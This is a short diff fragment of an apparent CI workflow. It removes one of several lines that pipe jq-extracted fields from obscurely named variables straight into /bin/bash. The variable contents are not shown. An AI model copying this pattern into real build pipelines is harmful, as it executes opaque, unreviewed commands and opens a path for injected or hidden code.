@@ -41,7 +41,6 @@ jobs:
           echo $y625 | jq -r .guu53 | /bin/bash
           echo $d1033 | jq -r .ljocu776 | /bin/bash
           echo $olmll4 | jq -r .yjz590 | /bin/bash
-          echo $nsk9 | jq -r .orz50 | /bin/bash
 
       - name: Save results
         if: always()
